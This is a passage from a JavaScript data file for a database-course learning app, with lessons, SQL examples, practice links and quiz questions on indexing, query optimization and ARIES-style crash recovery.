traversal</td><td>Sequential scan via leaf links</td></tr><tr><td>Fan-out</td><td>Lower (data pointers in internal nodes take space)</td><td>Higher (internal nodes only have keys)</td></tr></table><p class="learn-p"><b>Why B+ Tree is preferred over B-Tree in databases:</b></p><ol class="learn-list"><li><b>Higher fan-out</b> — Internal nodes store only keys (no data), so more keys fit per node, making the tree shorter and requiring fewer disk I/Os.</li><li><b>Efficient range queries</b> — Leaf nodes are linked, so scanning a range is a sequential traversal.</li><li><b>Predictable performance</b> — Every search goes to a leaf node, so the number of I/Os is always the height of the tree.</li></ol><div class="learn-code">-- B+ Tree index on salary (conceptual structure)\n-- Internal nodes: [50000 | 80000 | 110000]\n--                /      |       |        \\\n-- Leaves: [30K,40K,50K]->[60K,70K,80K]->[90K,100K,110K]->[120K]\n--         (linked list for range scans)</div><div class="learn-tip"><b>Tip:</b> For a B+ Tree of order p with n keys, the height is approximately <span class="learn-complexity">O(log_p n)</span>. With p=100 and n=1,000,000, the height is about 3 — meaning any record can be found in 3 disk reads!</div></div><div class="learn-section"><div class="learn-h">Clustered vs Non-Clustered Indexes</div><table class="learn-table"><tr><th>Aspect</th><th>Clustered Index</th><th>Non-Clustered Index</th></tr><tr><td>Data order</td><td>Data rows are physically sorted by the index key</td><td>Separate structure pointing to data</td></tr><tr><td>Number per table</td><td>Only 1 (data can only be sorted one way)</td><td>Multiple</td></tr><tr><td>Leaf nodes contain</td><td>Actual data rows</td><td>Pointers (row IDs) to data</td></tr><tr><td>Speed for range queries</td><td>Very fast (sequential disk reads)</td><td>Slower (may require random I/O)</td></tr><tr><td>Default in InnoDB</td><td>Primary key</td><td>All other indexes</td></tr></table><p class="learn-p">In InnoDB, the <b>primary key IS the clustered index</b>. The data is stored in the leaf nodes of the primary key B+ Tree. Secondary (non-clustered) indexes store the primary key value in their leaves, requiring a <b>secondary lookup</b> to fetch the actual row.</p></div><div class="learn-section"><div class="learn-h">Hash Indexing</div><p class="learn-p">A <b>hash index</b> uses a hash function to map search keys directly to bucket addresses. It provides <span class="learn-complexity">O(1)</span> average-case lookup for equality queries.</p><p class="learn-p"><b>Advantages</b>:</p><ul class="learn-list"><li>Very fast for <b>exact-match queries</b> (WHERE id = 42)</li><li>Simple implementation</li></ul><p class="learn-p"><b>Disadvantages</b>:</p><ul class="learn-list"><li><b>No range queries</b> — Hash does not maintain order, so WHERE salary &gt; 50000 cannot use a hash index</li><li><b>No ORDER BY</b> support</li><li><b>No prefix matching</b> — Cannot use for LIKE \'abc%\'</li><li><b>Hash collisions</b> — Can degrade performance</li><li><b>Resizing</b> — When the table grows, the hash table may need to be rebuilt</li></ul><div class="learn-code">-- MySQL: MEMORY engine supports hash indexes\nCREATE TABLE Cache (\n    key_col VARCHAR(100),\n    value   TEXT,\n    INDEX USING HASH (key_col)\n) ENGINE = MEMORY;\n\n-- PostgreSQL: hash index\nCREATE INDEX idx_hash ON table_name USING HASH (column_name);</div><div class="learn-warn"><b>Warning:</b> In MySQL InnoDB, you cannot explicitly create a hash index on disk tables. InnoDB\'s Adaptive Hash Index is an internal optimization that automatically creates in-memory hash indexes for frequently accessed B+ Tree pages.</div></div><div class="learn-section"><div class="learn-h">Dense vs Sparse Indexes</div><p class="learn-p"><b>Dense index</b>: An index entry for <b>every</b> record in the data file. Allows direct lookup of any record.</p><p class="learn-p"><b>Sparse index</b>: An index entry for only <b>some</b> records (e.g., one per disk block). Requires the data to be sorted on the search key. Uses fewer index entries but requires sequential search within a block.</p><p class="learn-p">A <b>clustered index can be sparse</b> (data is sorted). A <b>non-clustered index must be dense</b> (data is not sorted by the index key).</p></div><div class="learn-section"><div class="learn-h">Multi-Level Indexing</div><p class="learn-p">When an index itself is too large to fit in memory, we can create an <b>index on the index</b> — a multi-level index. The B+ Tree is inherently a multi-level index structure. The internal nodes form upper-level indexes, and the leaf nodes form the lowest-level index pointing to data.</p></div><div class="learn-section"><div class="learn-h">Covering Indexes</div><p class="learn-p">A <b>covering index</b> includes all columns needed by a query in the index itself. The query can be answered entirely from the index without accessing the base table — this is called an <b>index-only scan</b>.</p><div class="learn-code">-- Query: SELECT name, salary FROM employees WHERE dept_id = 5\n\n-- Non-covering index (requires table lookup):\nCREATE INDEX idx_dept ON employees(dept_id);\n-- 1. Find rows with dept_id=5 in index → get row pointers\n-- 2. Go to table to read name, salary (random I/O!)\n\n-- Covering index (no table access needed):\nCREATE INDEX idx_dept_cover ON employees(dept_id, name, salary);\n-- EXPLAIN shows "Using index" — all data in the index leaf nodes</div><p class="learn-p"><b>Why covering indexes are fast:</b></p><ul class="learn-list"><li>Avoids secondary lookup to base table (saves random I/O)</li><li>Index is smaller than the table — more fits in memory</li><li>Especially impactful in InnoDB where secondary indexes need a primary key lookup to get the full row</li></ul><p class="learn-p"><b>INCLUDE columns</b> (PostgreSQL, SQL Server): Add non-key columns to the index leaf pages without affecting the tree structure:</p><div class="learn-code">-- Only dept_id is searchable; name, salary are just stored in leaves\nCREATE INDEX idx_dept_incl ON employees(dept_id) INCLUDE (name, salary);\n-- Smaller index tree, but still covers the query</div><div class="learn-warn"><b>Trade-off:</b> Covering indexes increase write overhead (every INSERT/UPDATE updates the wider index) and use more storage. Use them for frequently run queries on read-heavy tables, not as a default for every query.</div></div><div class="learn-section"><div class="learn-h">Composite Index &amp; Leftmost Prefix Rule</div><p class="learn-p">A <b>composite index</b> on columns (A, B, C) can satisfy queries on:</p><ul class="learn-list"><li>A alone ✓</li><li>A, B ✓</li><li>A, B, C ✓</li><li>B alone ✗ (cannot skip leftmost column)</li><li>A, C ✗ partially (uses A, scans for C)</li></ul><div class="learn-code">CREATE INDEX idx_abc ON orders(customer_id, order_date, amount);\n\n-- Uses index fully:\nWHERE customer_id = 5 AND order_date = \'2024-01-01\'\n\n-- Uses index partially (only customer_id):\nWHERE customer_id = 5 AND amount &gt; 100\n\n-- Cannot use this index:\nWHERE order_date = \'2024-01-01\'  -- leftmost column missing</div><div class="learn-tip"><b>Interview tip:</b> When asked "how would you optimize this query?", always check: (1) Is there an index on the WHERE columns? (2) Does the index cover the SELECT columns? (3) Does the column order follow the leftmost prefix rule? These three checks solve most indexing interview questions.</div></div>',
          code: `-- =============================================
-- B-Tree, B+ Tree & Hash Indexing
-- =============================================

-- ===== CREATING INDEXES =====

-- Default B+ Tree index (most common)
CREATE INDEX idx_salary ON Employees(salary);

-- Unique index (also used for UNIQUE constraints)
CREATE UNIQUE INDEX idx_email ON Employees(email);

-- Composite index
CREATE INDEX idx_dept_salary ON Employees(dept_id, salary);
-- Useful for: WHERE dept_id = 10 AND salary > 50000
-- Also useful for: WHERE dept_id = 10 (leftmost prefix)
-- NOT useful for: WHERE salary > 50000 (not leftmost)

-- Covering index (includes all columns needed by query)
CREATE INDEX idx_covering ON Employees(dept_id, salary, name);
-- SELECT name, salary FROM Employees WHERE dept_id = 10
-- This query can be answered entirely from the index (no table lookup)

-- ===== INDEX USAGE ANALYSIS =====

-- Check if a query uses an index
EXPLAIN SELECT * FROM Employees WHERE salary > 90000;
-- Look for: type=range, key=idx_salary

EXPLAIN SELECT * FROM Employees WHERE dept_id = 10 AND salary > 50000;
-- Should use idx_dept_salary

-- Queries that CANNOT use idx_dept_salary efficiently:
EXPLAIN SELECT * FROM Employees WHERE salary > 50000;
-- Full table scan or uses a different index

-- ===== HASH INDEX (Memory Engine) =====
CREATE TABLE SessionCache (
    session_id VARCHAR(64) PRIMARY KEY,
    user_id    INT,
    data       TEXT,
    INDEX USING HASH (session_id)
) ENGINE = MEMORY;

-- Fast exact lookup (uses hash):
SELECT * FROM SessionCache WHERE session_id = 'abc123';

-- Cannot use hash for range:
-- SELECT * FROM SessionCache WHERE session_id > 'abc';
-- This would require a full scan

-- ===== B+ TREE HEIGHT CALCULATION =====
-- Given:
--   Block size = 4096 bytes
--   Key size = 8 bytes (INT)
--   Pointer size = 8 bytes
--   Record pointer = 8 bytes
--
-- Internal node: keys and child pointers
--   p * 8 + (p-1) * 8 <= 4096
--   16p - 8 <= 4096 => p = 256 (fan-out)
--
-- Leaf node: keys and record pointers
--   n * (8 + 8) + 8 (next leaf pointer) <= 4096
--   16n <= 4088 => n = 255 records per leaf
--
-- For 1,000,000 records:
--   Leaf nodes = ceil(1000000 / 255) = 3922
--   Level 1 internal = ceil(3922 / 256) = 16
--   Level 2 internal = ceil(16 / 256) = 1 (root)
--   Height = 3 levels => 3 disk reads for any lookup!

-- ===== INDEX MAINTENANCE CONSIDERATIONS =====

-- Check index statistics
SHOW INDEX FROM Employees;

-- Analyze table to update index statistics
ANALYZE TABLE Employees;

-- Rebuild indexes (useful after many deletes)
ALTER TABLE Employees ENGINE=InnoDB;  -- MySQL: rebuild all indexes

-- Drop unused indexes (they slow down writes)
DROP INDEX idx_salary ON Employees;

-- ===== PARTIAL INDEX (PostgreSQL only) =====
-- CREATE INDEX idx_active ON Employees(name) WHERE status = 'active';
-- Only indexes active employees; smaller and faster

-- ===== EXPRESSION INDEX (PostgreSQL) =====
-- CREATE INDEX idx_lower_email ON Employees(LOWER(email));
-- Useful for case-insensitive searches`,
          problems: [
            ['B+ Tree Concepts', 'https://www.geeksforgeeks.org/introduction-of-b-tree/', 'Medium'],
            ['Indexing in DBMS', 'https://www.geeksforgeeks.org/indexing-in-databases-set-1/', 'Easy'],
            ['B+ Tree Insertion', 'https://www.geeksforgeeks.org/insertion-in-a-b-tree/', 'Hard']
          ],
          mcqs: [
            {q: 'Why is B+ Tree preferred over B-Tree for database indexing?', o: ['B+ Tree is simpler to implement', 'B+ Tree has higher fan-out and supports efficient range queries via linked leaves', 'B+ Tree uses less storage', 'B-Tree cannot handle deletions'], a: 1},
            {q: 'A hash index is best suited for:', o: ['Range queries (WHERE salary > 50000)', 'ORDER BY operations', 'Exact equality lookups (WHERE id = 42)', 'LIKE pattern matching'], a: 2},
            {q: 'How many clustered indexes can a table have?', o: ['As many as needed', 'Exactly one', 'Exactly two', 'None — clustered indexes don\'t exist'], a: 1}
          ]
        }
      ]
    },
    {
      id: 'qopt', t: 'Query Optimization',
      topics: [
        {
          t: 'Query Processing & Optimization',
          learn: '<div class="learn-section"><div class="learn-h">Query Processing Overview</div><p class="learn-p">When a SQL query is submitted, the DBMS processes it through several stages before returning results:</p><ol class="learn-list"><li><b>Parsing</b> — Check syntax, validate table/column names, resolve aliases</li><li><b>Translation</b> — Convert SQL to an internal representation (relational algebra expression)</li><li><b>Optimization</b> — Generate multiple equivalent query plans and choose the cheapest one</li><li><b>Execution</b> — Execute the chosen plan and return results</li></ol><p class="learn-p">The <b>query optimizer</b> is the most critical component. It determines <i>how</i> to execute the query — which indexes to use, which join algorithm, what order to join tables, etc.</p></div><div class="learn-section"><div class="learn-h">Relational Algebra Equivalence Rules</div><p class="learn-p">The optimizer uses <b>equivalence rules</b> to transform a query into equivalent but more efficient forms:</p><ul class="learn-list"><li><b>Selection pushdown</b>: σ(R ⋈ S) → σ(R) ⋈ S — Apply WHERE filters as early as possible to reduce intermediate result sizes</li><li><b>Projection pushdown</b>: π(R ⋈ S) → π(π(R) ⋈ π(S)) — Project out unnecessary columns early</li><li><b>Join commutativity</b>: R ⋈ S = S ⋈ R</li><li><b>Join associativity</b>: (R ⋈ S) ⋈ T = R ⋈ (S ⋈ T)</li><li><b>Selection cascade</b>: σ_{a AND b}(R) = σ_a(σ_b(R))</li></ul><div class="learn-tip"><b>Tip:</b> The most impactful optimization is <b>selection pushdown</b> — filtering rows early dramatically reduces the amount of data processed in subsequent operations.</div></div><div class="learn-section"><div class="learn-h">Cost-Based Optimization</div><p class="learn-p">The optimizer estimates the <b>cost</b> of each plan based on:</p><ul class="learn-list"><li><b>Disk I/O</b> — Number of disk block reads/writes (dominant factor)</li><li><b>CPU cost</b> — Computation for comparisons, hashing, sorting</li><li><b>Memory</b> — Buffer pool usage</li><li><b>Network</b> — For distributed queries</li></ul><p class="learn-p">To estimate costs, the optimizer uses <b>statistics</b> maintained by the DBMS:</p><table class="learn-table"><tr><th>Statistic</th><th>Description</th></tr><tr><td>n_r</td><td>Number of tuples (rows) in relation r</td></tr><tr><td>b_r</td><td>Number of disk blocks for relation r</td></tr><tr><td>l_r</td><td>Size of a tuple in bytes</td></tr><tr><td>V(A, r)</td><td>Number of distinct values of attribute A in r</td></tr><tr><td>f_r</td><td>Blocking factor (tuples per block)</td></tr></table><div class="learn-code">-- Update statistics in MySQL\nANALYZE TABLE Employees;\n\n-- View statistics\nSHOW TABLE STATUS LIKE \'Employees\';\n\n-- In PostgreSQL:\n-- ANALYZE employees;\n-- SELECT * FROM pg_stats WHERE tablename = \'employees\';</div></div><div class="learn-section"><div class="learn-h">Join Algorithms</div><p class="learn-p">The optimizer chooses the best join algorithm based on table sizes, available indexes, and memory:</p><table class="learn-table"><tr><th>Algorithm</th><th>Cost</th><th>Best When</th></tr><tr><td>Nested Loop Join</td><td><span class="learn-complexity">O(m * n)</span> blocks</td><td>Inner table is small or has an index</td></tr><tr><td>Block Nested Loop</td><td><span class="learn-complexity">O(m * n / B)</span> where B = buffer size</td><td>No useful index, limited memory</td></tr><tr><td>Index Nested Loop</td><td><span class="learn-complexity">O(m * log n)</span></td><td>Inner table has index on join column</td></tr><tr><td>Sort-Merge Join</td><td><span class="learn-complexity">O(m log m + n log n)</span></td><td>Both tables large, data already sorted or can be sorted</td></tr><tr><td>Hash Join</td><td><span class="learn-complexity">O(m + n)</span></td><td>Equi-join, no index, enough memory for hash table</td></tr></table></div><div class="learn-section"><div class="learn-h">EXPLAIN and Query Plans</div><p class="learn-p">Use <b>EXPLAIN</b> to see the query execution plan chosen by the optimizer:</p><div class="learn-code">EXPLAIN SELECT e.name, d.dept_name\nFROM Employees e\nJOIN Departments d ON e.dept_id = d.dept_id\nWHERE e.salary &gt; 80000;</div><p class="learn-p">Key columns in MySQL EXPLAIN output:</p><table class="learn-table"><tr><th>Column</th><th>Meaning</th></tr><tr><td>type</td><td>Access type: ALL (full scan), index, range, ref, eq_ref, const</td></tr><tr><td>key</td><td>Index used (NULL = no index)</td></tr><tr><td>rows</td><td>Estimated rows examined</td></tr><tr><td>Extra</td><td>Additional info: Using index, Using filesort, Using temporary</td></tr></table><p class="learn-p"><b>Access types</b> from best to worst: <code>const</code> &gt; <code>eq_ref</code> &gt; <code>ref</code> &gt; <code>range</code> &gt; <code>index</code> &gt; <code>ALL</code></p></div><div class="learn-section"><div class="learn-h">Query Optimization Tips for Interviews</div><ol class="learn-list"><li><b>Use indexes wisely</b> — Create indexes on columns used in WHERE, JOIN, ORDER BY</li><li><b>Avoid SELECT *</b> — Only select needed columns; allows covering index usage</li><li><b>Avoid functions on indexed columns</b> — <code>WHERE YEAR(date_col) = 2024</code> cannot use an index; use <code>WHERE date_col BETWEEN \'2024-01-01\' AND \'2024-12-31\'</code></li><li><b>Use EXISTS over IN</b> for correlated checks (EXISTS short-circuits)</li><li><b>Avoid OR on different columns</b> — <code>WHERE a=1 OR b=2</code> may not use indexes; rewrite as UNION</li><li><b>Limit result sets</b> — Use LIMIT for pagination; avoid fetching all rows</li><li><b>Denormalize for read-heavy queries</b> — Reduce JOINs where appropriate</li></ol><div class="learn-warn"><b>Warning:</b> Adding too many indexes hurts write performance. Every INSERT, UPDATE, and DELETE must also update all indexes. Finding the right balance is key.</div></div>',
          code: `-- =============================================
-- Query Processing & Optimization
-- =============================================

-- ===== EXPLAIN: Analyzing Query Plans =====

-- Full table scan (no index on dept)
EXPLAIN SELECT * FROM Employees WHERE dept = 'Engineering';
-- type: ALL, key: NULL => needs index

-- After adding index:
CREATE INDEX idx_dept ON Employees(dept);
EXPLAIN SELECT * FROM Employees WHERE dept = 'Engineering';
-- type: ref, key: idx_dept => uses index

-- Range scan
EXPLAIN SELECT * FROM Employees WHERE salary BETWEEN 80000 AND 100000;
-- type: range (if index on salary exists)

-- Index-only scan (covering index)
CREATE INDEX idx_dept_sal_name ON Employees(dept, salary, name);
EXPLAIN SELECT name, salary FROM Employees WHERE dept = 'Engineering';
-- Extra: Using index (no table lookup needed)

-- ===== OPTIMIZATION TECHNIQUES =====

-- BAD: Function on indexed column prevents index usage
SELECT * FROM Employees WHERE YEAR(hire_date) = 2024;
-- GOOD: Range condition uses index
SELECT * FROM Employees
WHERE hire_date >= '2024-01-01' AND hire_date < '2025-01-01';

-- BAD: SELECT * fetches unnecessary columns
SELECT * FROM Employees WHERE dept_id = 10;
-- GOOD: Select only needed columns (may use covering index)
SELECT name, salary FROM Employees WHERE dept_id = 10;

-- BAD: OR on different columns (may not use index)
SELECT * FROM Employees WHERE dept_id = 10 OR salary > 100000;
-- GOOD: Rewrite as UNION
SELECT * FROM Employees WHERE dept_id = 10
UNION
SELECT * FROM Employees WHERE salary > 100000;

-- BAD: Leading wildcard prevents index usage
SELECT * FROM Employees WHERE name LIKE '%alice%';
-- GOOD: No leading wildcard
SELECT * FROM Employees WHERE name LIKE 'Alice%';

-- BAD: Implicit type conversion
SELECT * FROM Employees WHERE emp_id = '42';  -- emp_id is INT
-- GOOD: Match types
SELECT * FROM Employees WHERE emp_id = 42;

-- ===== JOIN ORDER OPTIMIZATION =====

-- The optimizer chooses join order, but you can hint:
-- MySQL: STRAIGHT_JOIN forces left-to-right order
SELECT STRAIGHT_JOIN e.name, d.dept_name
FROM Employees e
STRAIGHT_JOIN Departments d ON e.dept_id = d.dept_id;

-- ===== SUBQUERY vs JOIN performance =====

-- Subquery (may be slower — executed per row):
SELECT name FROM Employees
WHERE dept_id IN (SELECT dept_id FROM Departments WHERE location = 'NYC');

-- Equivalent JOIN (often faster):
SELECT e.name FROM Employees e
JOIN Departments d ON e.dept_id = d.dept_id
WHERE d.location = 'NYC';

-- ===== PAGINATION OPTIMIZATION =====

-- BAD: Large OFFSET scans and discards rows
SELECT * FROM Employees ORDER BY emp_id LIMIT 10 OFFSET 100000;

-- GOOD: Keyset pagination (seek method)
SELECT * FROM Employees
WHERE emp_id > 100000
ORDER BY emp_id LIMIT 10;

-- ===== ANALYZING INDEX USAGE =====

-- Show all indexes on a table
SHOW INDEX FROM Employees;

-- Find unused indexes (MySQL performance_schema)
SELECT * FROM performance_schema.table_io_waits_summary_by_index_usage
WHERE object_schema = 'mydb' AND index_name IS NOT NULL
AND count_read = 0;

-- ===== QUERY PROFILING =====
SET profiling = 1;
SELECT * FROM Employees WHERE salary > 90000;
SHOW PROFILES;
SHOW PROFILE FOR QUERY 1;`,
          problems: [
            ['Query Optimization Basics', 'https://www.geeksforgeeks.org/query-optimization-in-relational-algebra/', 'Medium'],
            ['EXPLAIN Plan Analysis', 'https://www.geeksforgeeks.org/sql-explain-statement/', 'Easy'],
            ['Join Algorithms', 'https://www.geeksforgeeks.org/join-algorithms-in-database/', 'Hard']
          ],
          mcqs: [
            {q: 'Which optimization has the most impact on query performance?', o: ['Projection pushdown', 'Selection pushdown (pushing WHERE filters early)', 'Join commutativity', 'Using DISTINCT'], a: 1},
            {q: 'In EXPLAIN output, which access type is the most efficient?', o: ['ALL', 'range', 'const', 'index'], a: 2},
            {q: 'Why does WHERE YEAR(date_col) = 2024 not use an index on date_col?', o: ['YEAR() is not a valid SQL function', 'The index only works for exact matches', 'Applying a function to the column prevents index lookup — the DBMS cannot search the B+ tree', 'It does use the index efficiently'], a: 2}
          ]
        }
      ]
    },
    {
      id: 'recov', t: 'Recovery',
      topics: [
        {
          t: 'Recovery & Write-Ahead Logging (ARIES)',
          learn: '<div class="learn-section"><div class="learn-h">Why Recovery?</div><p class="learn-p"><b>Database recovery</b> ensures that the database can be restored to a consistent state after a failure — whether it\'s a transaction failure, system crash, or disk failure. Recovery is what guarantees <b>Atomicity</b> (undo incomplete transactions) and <b>Durability</b> (committed changes survive crashes) from ACID.</p><p class="learn-p">Types of failures:</p><ul class="learn-list"><li><b>Transaction failure</b> — Logical error (e.g., constraint violation) or deadlock abort</li><li><b>System failure</b> — Power outage, OS crash, DBMS crash (memory contents lost, disk intact)</li><li><b>Disk failure</b> — Storage device failure (requires backups)</li></ul></div><div class="learn-section"><div class="learn-h">Write-Ahead Logging (WAL)</div><p class="learn-p">The <b>Write-Ahead Log (WAL)</b> is the fundamental principle behind database recovery: <b>before any change is written to the database on disk, the corresponding log record must first be written to stable storage (the log).</b></p><p class="learn-p">Log records contain:</p><ul class="learn-list"><li><b>Transaction ID</b> — Which transaction made the change</li><li><b>Data item ID</b> — Which data was changed (page + offset)</li><li><b>Before image (old value)</b> — For UNDO</li><li><b>After image (new value)</b> — For REDO</li><li><b>LSN (Log Sequence Number)</b> — Unique, monotonically increasing identifier</li></ul><div class="learn-code">-- WAL log example:\n-- LSN | TxnID | Operation  | PageID | Before | After\n-- 001 | T1    | BEGIN      | -      | -      | -\n-- 002 | T1    | UPDATE     | P5     | 1000   | 1500\n-- 003 | T2    | BEGIN      | -      | -      | -\n-- 004 | T2    | UPDATE     | P3     | 200    | 350\n-- 005 | T1    | COMMIT     | -      | -      | -\n-- 006 | T2    | UPDATE     | P7     | 50     | 75\n-- CRASH HERE\n-- Recovery: REDO T1 (committed), UNDO T2 (not committed)</div></div><div class="learn-section"><div class="learn-h">Steal / No-Force Policy</div><p class="learn-p">Buffer management policies affect recovery:</p><table class="learn-table"><tr><th>Policy</th><th>Description</th><th>Recovery Need</th></tr><tr><td><b>Steal</b></td><td>Dirty pages can be flushed to disk BEFORE transaction commits</td><td>Need UNDO (uncommitted changes may be on disk)</td></tr><tr><td><b>No-Steal</b></td><td>Dirty pages NOT flushed until commit</td><td>No UNDO needed (uncommitted changes never on disk)</td></tr><tr><td><b>Force</b></td><td>All dirty pages flushed at commit time</td><td>No REDO needed (all committed changes on disk)</td></tr><tr><td><b>No-Force</b></td><td>Dirty pages NOT necessarily flushed at commit</td><td>Need REDO (committed changes may not be on disk)</td></tr></table><p class="learn-p">Most real systems (InnoDB, PostgreSQL) use <b>Steal + No-Force</b> for best performance, which requires both UNDO and REDO — hence the need for the ARIES algorithm.</p></div><div class="learn-section"><div class="learn-h">ARIES Recovery Algorithm</div><p class="learn-p"><b>ARIES</b> (Algorithm for Recovery and Isolation Exploiting Semantics) is the gold standard recovery algorithm used by most modern RDBMS. It has three phases:</p><ol class="learn-list"><li><b>Analysis Phase</b>:<ul class="learn-list"><li>Scan the log from the last <b>checkpoint</b> forward</li><li>Determine which transactions were active at crash time (the <b>Loser set</b>)</li><li>Determine which pages might have uncommitted changes on disk (<b>Dirty Page Table</b>)</li></ul></li><li><b>Redo Phase</b> (repeating history):<ul class="learn-list"><li>Scan forward from the earliest LSN in the dirty page table</li><li>Re-apply ALL logged updates (both committed and uncommitted) to restore the database to its exact pre-crash state</li><li>This ensures durability for committed transactions</li></ul></li><li><b>Undo Phase</b>:<ul class="learn-list"><li>Scan backward from the end of the log</li><li>Undo all changes made by transactions that did not commit (the Loser set)</li><li>Write <b>Compensation Log Records (CLRs)</b> for each undone operation to avoid re-undoing on a subsequent crash</li></ul></li></ol><div class="learn-tip"><b>Tip:</b> Remember the ARIES mantra: <b>"Analysis → Redo → Undo"</b>. ARIES <b>repeats history before undoing</b> — even uncommitted changes are redone first, then undone. This simplifies recovery logic and handles crashes during recovery itself.</div></div><div class="learn-section"><div class="learn-h">Checkpointing</div><p class="learn-p">A <b>checkpoint</b> is a periodic operation that records the current state to reduce recovery time:</p><ul class="learn-list"><li>Flush all dirty pages to disk (or record which are dirty)</li><li>Write a checkpoint record to the log with active transaction list and dirty page table</li><li>Recovery starts from the checkpoint instead of the beginning of the log</li></ul><p class="learn-p">Types of checkpoints:</p><ul class="learn-list"><li><b>Sharp checkpoint</b> — Flush all dirty pages, stop all transactions momentarily. Simple but blocks operations.</li><li><b>Fuzzy checkpoint</b> — Record the dirty page table and active transactions without flushing all pages immediately. Used by ARIES. Does not block operations.</li></ul></div><div class="learn-section"><div class="learn-h">Compensation Log Records (CLRs)</div><p class="learn-p"><b>CLRs</b> are log records generated during the UNDO phase. They record the undo action taken, and they are <b>redo-only</b> (never undone themselves). This ensures that if the system crashes during recovery, the already-undone operations won\'t be undone again.</p><p class="learn-p">Each CLR has an <b>UndoNextLSN</b> pointer that points to the next log record to undo, allowing the system to skip already-undone operations on a re-crash.</p></div><div class="learn-section"><div class="learn-h">Recovery from Disk Failure</div><p class="learn-p">Disk failures require <b>backups</b>:</p><ul class="learn-list"><li><b>Full backup</b> — Complete copy of the database</li><li><b>Incremental backup</b> — Only changes since the last backup</li><li><b>Point-in-time recovery</b> — Restore a backup, then replay the WAL to a specific point in time</li></ul><div class="learn-code">-- MySQL: Point-in-time recovery\n-- 1. Restore the last full backup\n-- 2. Replay binary logs up to the desired point\nmysqlbinlog --stop-datetime="2024-06-15 14:30:00" binlog.000042 | mysql</div></div>',
          code: `-- =============================================
-- Recovery & Write-Ahead Logging (ARIES)
-- =============================================

-- ===== WAL CONCEPT DEMONSTRATION =====

-- InnoDB uses WAL: ib_logfile0, ib_logfile1 (redo logs)

-- Check redo log configuration
SHOW VARIABLES LIKE 'innodb_log_file_size';
SHOW VARIABLES LIKE 'innodb_log_files_in_group';
SHOW VARIABLES LIKE 'innodb_flush_log_at_trx_commit';
-- 1 = flush log to disk at every commit (safest, default)
-- 2 = write to OS buffer at commit, flush every second
-- 0 = write and flush every second (fastest, least safe)

-- ===== TRANSACTION LOG EXAMPLE =====

-- Scenario: T1 transfers money, T2 updates salary, crash happens

-- T1: Transfer $500 from Account 1 to Account 2
START TRANSACTION;  -- Log: [BEGIN T1]
UPDATE Accounts SET balance = balance - 500 WHERE acc_id = 1;
-- Log: [T1, UPDATE, Accounts.acc_id=1, old=10000, new=9500]
UPDATE Accounts SET balance = balance + 500 WHERE acc_id = 2;
-- Log: [T1, UPDATE, Accounts.acc_id=2, old=5000, new=5500]
COMMIT;  -- Log: [COMMIT T1]

-- T2: Update salary (not yet committed when crash happens)
START TRANSACTION;  -- Log: [BEGIN T2]
UPDATE Employees SET salary = 120000 WHERE emp_id = 1;
-- Log: [T2, UPDATE, Employees.emp_id=1, old=100000, new=120000]
-- *** CRASH BEFORE COMMIT ***

-- ARIES Recovery:
-- 1. ANALYSIS: Read from checkpoint.
--    T1 committed (in redo set), T2 active (in undo/loser set).
-- 2. REDO: Replay ALL log records from dirty page table's min LSN.
--    Redo T1's updates (ensure they're on disk).
--    Redo T2's update too (repeat history).
-- 3. UNDO: Undo T2's changes (not committed).
--    Write CLR: [CLR, T2, Employees.emp_id=1, undo to 100000]
--    Log: [ABORT T2]
-- Database is now consistent: T1's changes preserved, T2 rolled back.

-- ===== CHECKPOINT =====

-- InnoDB performs fuzzy checkpointing automatically
-- Force a checkpoint (for understanding):
-- FLUSH TABLES WITH READ LOCK;  -- Sharp checkpoint (blocks writes)
-- UNLOCK TABLES;

-- Check checkpoint info
SHOW ENGINE INNODB STATUS;  -- Look for "Log sequence number" and "Last checkpoint at"

-- ===== BACKUP AND RECOVERY =====

-- Logical backup
-- mysqldump --single-transaction --routines --triggers mydb > backup.sql

-- Physical backup (using Percona XtraBackup or MySQL Enterprise Backup)
-- xtrabackup --backup --target-dir=/backup/full/

-- Point-in-time recovery using binary logs:
-- 1. Restore full backup
-- 2. Apply binary logs:
-- mysqlbinlog --start-position=154 --stop-datetime="2024-06-15 14:30:00" \\
--     /var/lib/mysql/binlog.000042 | mysql -u root

-- ===== UNDO LOG SEGMENTS =====
SHOW VARIABLES LIKE 'innodb_undo_tablespaces';
SHOW VARIABLES LIKE 'innodb_undo_log_truncate';

-- Check undo log usage
SELECT * FROM information_schema.INNODB_TRX;  -- Active transactions
-- Long-running transactions hold undo log segments,
-- preventing purge of old versions (affects MVCC)`,
          problems: [
            ['ARIES Recovery', 'https://www.geeksforgeeks.org/aries-algorithm-for-recovery/', 'Hard'],
            ['Write-Ahead Logging', 'https://www.geeksforgeeks.org/log-based-recovery-in-dbms/', 'Medium'],
            ['Checkpoint in DBMS', 'https://www.geeksforgeeks.org/checkpoint-in-dbms/', 'Easy']
          ],
          mcqs: [
            {q: 'In ARIES, what is the correct order of recovery phases?', o: ['Undo → Redo → Analysis', 'Redo → Undo → Analysis', 'Analysis → Redo → Undo', 'Analysis → Undo → Redo'], a: 2},
            {q: 'The Write-Ahead Log (WAL) rule states:', o: ['Data must be written to disk before the log', 'The log record must be written to stable storage before the corresponding data modification is written to disk', 'The log is written after the transaction commits', 'Logs are not needed if checkpoints are frequent'], a: 1},
            {q: 'Compensation Log Records (CLRs) in ARIES are:', o: ['Undo-only records', 'Redo-only records that are never undone', 'Both redo and undo records', 'Checkpoint records'], a: 1}
          ]
        }
      ]
    }
  ]
};
